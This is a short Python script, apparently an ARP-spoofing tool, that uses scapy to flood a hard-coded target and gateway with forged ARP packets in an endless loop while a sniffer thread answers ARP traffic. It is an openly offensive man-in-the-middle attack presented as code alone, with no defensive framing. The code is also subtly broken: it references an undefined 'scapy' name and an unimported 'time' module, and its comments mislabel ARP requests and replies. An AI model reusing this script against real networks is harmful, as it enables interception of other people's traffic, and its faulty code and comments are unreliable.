import os
import subprocess
from scapy.all import *
import threading

gateway_ip = "198.30.20.1"
target_ip = "198.62.20.1"

def spoof(target_ip, gateway_ip):
    print(f"[*] Starting ARP Spoof - [{gateway_ip}] is impersonating [{target_ip}]")
    
    while True:
        # Send out an ARP request (ARP reply) to the target IP asking who has the gateway's IP.
        arp_request = scapy.ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        
        # Send out an ARP reply (ARP request) to the gateway telling it that we have the target's IP.
        arp_reply = scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
        
        # Send out both packets to the network
        send(arp_request, verbose=False)
        send(arp_reply, verbose=False)
        
        time.sleep(2)  # Sleep for a bit before sending again

def restore(packet):
    if packet[scapy.ARP].op == 2:  # If the packet is an ARP request (not a reply)
        # Send out an ARP response to the sender, telling them that we don't have the IP they asked about.
        send(scapy.ARP(op=2, pdst=packet[scapy.ARP].psrc, hwdst=packet[scapy.Ether].src, psrc=gateway_ip), verbose=False)
        
        print(f"[*] Restored - [{gateway_ip}] -> [{target_ip}]")

def sniff_network():
    # Start the network sniffer. The filter ensures we only capture ARP traffic for our gateway and target IPs.
    sniff(filter="arp", prn=restore, store=0)

# Start the ARP spoofing thread
spoof_thread = threading.Thread(target=spoof, args=(target_ip, gateway_ip))
spoof_thread.start()

# Start the network sniffer in a separate thread
sniff_network_thread = threading.Thread(target=sniff_network)
sniff_network_thread.start()